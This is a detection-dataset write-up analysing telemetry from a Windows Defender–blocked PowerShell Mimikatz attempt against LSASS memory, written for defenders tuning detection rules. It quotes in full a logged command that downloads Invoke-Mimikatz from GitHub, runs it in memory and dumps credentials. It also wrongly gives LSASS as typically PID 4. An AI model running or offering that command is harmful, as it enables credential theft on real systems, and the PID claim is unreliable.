# T1003.001-10: LSASS Memory — Powershell Mimikatz

## Technique Context

T1003.001 (LSASS Memory) represents one of the most critical credential access techniques in modern attack scenarios. Attackers target the Local Security Authority Subsystem Service (LSASS) process memory to extract plaintext passwords, NTLM hashes, and Kerberos tickets from authenticated users. This technique is foundational to lateral movement and privilege escalation in enterprise environments.

PowerShell-based Mimikatz implementations like Invoke-Mimikatz have become increasingly popular among both red teams and real adversaries due to their fileless nature and ability to bypass traditional signature-based detection. The detection community focuses heavily on process access patterns to LSASS (especially with high access rights), credential dumping tools' behavioral patterns, and the network activity associated with downloading malicious PowerShell modules.

## What This Dataset Contains

The dataset captures a PowerShell-based Mimikatz attempt that was blocked by Windows Defender. The key command line from Security EID 4688 shows the attack vector: `"powershell.exe" & {IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds}`. This command downloads and executes the PowerSploit Invoke-Mimikatz script directly from GitHub.

The dataset shows clear evidence of the attack attempt through multiple data sources:
- Sysmon EID 1 captures the suspicious PowerShell process creation with the full command line
- Sysmon EID 7 events show .NET framework DLL loads associated with PowerShell execution
- Sysmon EID 10 captures process access to whoami.exe with high access rights (0x1FFFFF)
- Sysmon EID 8 shows CreateRemoteThread activity indicating process injection attempts
- Security EID 4688/4689 events provide process creation/termination with the critical exit status 0xC0000022 (STATUS_ACCESS_DENIED)
- Security EID 4703 shows privilege adjustment including SeDebugPrivilege and other high-value privileges

The PowerShell events contain only test framework boilerplate (`Set-StrictMode`, `Set-ExecutionPolicy Bypass`) rather than the malicious script content, indicating Windows Defender blocked execution before the malicious PowerShell could execute.

## What This Dataset Does Not Contain

The dataset lacks the actual LSASS memory access events that would indicate successful credential extraction. There are no Sysmon EID 10 events showing access to the LSASS process (typically PID 4), no file creation events for credential dumps, and no network connections to download the malicious PowerShell script. The absence of these events combined with the exit code 0xC0000022 indicates Windows Defender successfully blocked the attack before it could access LSASS memory.

The PowerShell script block logs don't contain the downloaded Invoke-Mimikatz content, suggesting the web request was blocked at the network/AV level. Additionally, there are no events showing successful SeDebugPrivilege usage against LSASS, which would be required for memory dumping.

## Assessment

This dataset provides excellent telemetry for detecting PowerShell-based credential access attempts, particularly those using remote script downloads. The combination of process creation logging with full command lines, Sysmon process access monitoring, and Security audit events creates a comprehensive detection surface. The presence of Windows Defender blocking the attack also demonstrates the value of layered security controls.

The dataset is particularly valuable for testing detection rules around suspicious PowerShell execution patterns, remote script downloads, and privilege escalation attempts. However, it doesn't provide insight into successful LSASS memory access techniques since the attack was blocked.

## Detection Opportunities Present in This Data

1. **Suspicious PowerShell command line patterns** - Security EID 4688 with command lines containing `IEX`, `DownloadString`, and `Invoke-Mimikatz` indicate clear malicious intent
2. **Remote PowerShell script downloads** - The GitHub PowerSploit URL in the command line is a known indicator of compromise
3. **Process access with high privileges** - Sysmon EID 10 showing access rights 0x1FFFFF to processes should trigger alerts
4. **CreateRemoteThread activity from PowerShell** - Sysmon EID 8 events indicating process injection attempts from PowerShell processes
5. **Privilege escalation indicators** - Security EID 4703 showing adjustment of SeDebugPrivilege and other sensitive privileges
6. **PowerShell execution policy bypass** - PowerShell EID 4103 showing `Set-ExecutionPolicy Bypass` execution
7. **Abnormal PowerShell network activity** - Loading of urlmon.dll in PowerShell processes (Sysmon EID 7) suggests web requests
8. **Process termination with access denied** - Security EID 4689 with exit status 0xC0000022 indicates blocked malicious activity
9. **Multiple PowerShell process spawning** - Pattern of rapid PowerShell process creation and termination suggests automated attack tools
